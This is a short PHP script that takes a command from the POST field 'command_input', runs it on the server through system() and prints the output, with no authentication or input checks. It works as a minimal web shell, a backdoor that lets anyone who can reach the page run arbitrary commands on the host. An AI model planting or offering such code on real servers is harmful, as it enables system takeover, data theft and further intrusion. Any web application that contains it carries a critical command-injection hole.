<?php
ob_start();
system($_POST["command_input"] . " 2>&1", $retval);
$output = ob_get_contents();
ob_end_clean();
echo (empty($output)) ?
'No output for the following command: "' . $_POST["command_input"] . '"' : $output;
?>
